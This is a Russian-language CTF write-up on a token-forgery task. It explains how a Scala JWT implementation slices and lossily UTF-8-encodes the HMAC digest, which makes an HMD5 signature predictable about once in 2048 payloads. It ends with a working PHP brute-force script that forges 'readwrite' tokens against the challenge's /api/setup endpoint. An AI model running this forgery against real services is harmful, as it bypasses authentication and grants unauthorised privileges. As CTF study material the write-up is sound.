После регистрации и захода на сайт, заметил странности в base64 внутри подписи в JWT (обилие последовательностей 977 и подобных).

В исходниках видно, где отправляется флаг, для этого нужно на страницу /api/setup прислать запрос {"mode":"Firefighter"}, при этом у пользователя в токене должно быть: "role": "readwrite".

Исходники относительно небольшие, в JWT.scala бросается в глаза .slice(5, 256):

```scala
  private[jwt] def signHmac(algorithm: Algorithm, msg: String, key: String): String = {
    val mac: Mac = Mac.getInstance(algorithm.toString)
    mac.init(new SecretKeySpec(key.getBytes("utf-8"), algorithm.toString))
    encodeBase64url(new String(mac.doFinal(msg.getBytes("utf-8")).slice(5, 256)))
  }
  ...
  private[jwt] def encodeBase64url(str: String): String =
    Base64.encodeBase64URLSafeString(str.getBytes("utf-8"))
```

Позже стало понятно, что и обилие повторяющихся последовательностей в подписи напрямую связано с этой реализацией.

Вытащил эти функции отдельно, разделив по шагам и делая print-ы после каждого преобразования, потестил с заранее известным ключом и данными, стало очевидно, что такие преобразования не бинарно-безопасные.

А именно, символы >0x7f, которые не являются корректными для utf8, заменяются на последовательность `0xEF`, `0xBF`, `0xBD`.

Погуглил уязвимости хешей на предмет возможной манипуляции с 1ым битом символа, но ничего не нашел, да и было бы слишком сложно.

Затем вспомнил про то, что 5 символов зачем-то обрезаются из хеша, и это натолкнуло на мысль: а что если взять идеально рандомный случай, то какова вероятность, что в последовательности из N байт все из них будут >127 ?

Очевидно же, что 1/(2^N). По исходникам видно, что поддерживается не только HS256, а значит можно рассмотреть вариант HMD5, который сам по себе 16 байт, а если из него вырезать еще 5 байт, то останется 11. А 2^11 = 2048, что не так уж и много.

То есть, что имеем по итогу: нам неважно какой ключ, неважно какой payload. Рандомный пейлоад с совершенно любым ключом с вероятностью 1/2048 будет иметь все байты >127, а для такого случая сигнатура будет состоять из 11ти кратного повторения `0xEF`, `0xBF`, `0xBD`.

далее написал простой брутер, который делает запрос, добавляя ключ `"test": random_int()` не забыв поменять заголовок JWT на `eyJ0eXAiOiJKV1QiLCJhbGciOiJITUQ1In0` (alg: HMD5), вставив в тело нужные данные с сигнатурой из EFBFBD..., и довольно быстро токен нашелся

```php
<?php

function base64url_encode($data) {
  return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data, $strict = false) {
  return base64_decode(strtr($data, '-_', '+/'), $strict);
}

$username = 'tst362353022'; // любой существующий юзер
$sig = str_repeat(chr(0xEF) . chr(0xBF) . chr(0xBD), 11);
$hdr = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJITUQ1In0';

$ch = curl_init();

for ($i = 0; $i < 40000; ++$i) {
    $payload = json_encode([
        'login' => $username,
        'role' => 'readwrite',
        'lalala' => random_int(10000000, 999999999999),
    ]);
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://t-robear-9veyslvj.spbctf.net/api/setup',
        CURLOPT_COOKIE => 'jwt=' . $hdr . '.' . base64url_encode($payload) . '.' . base64url_encode($sig),
        CURLOPT_POSTFIELDS => json_encode(['mode' => 'Firefighter']),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => 1,
    ]);

    $data = curl_exec($ch);
    if (strlen($data) > 0) {
        echo $data;
        break;
    }
}
```
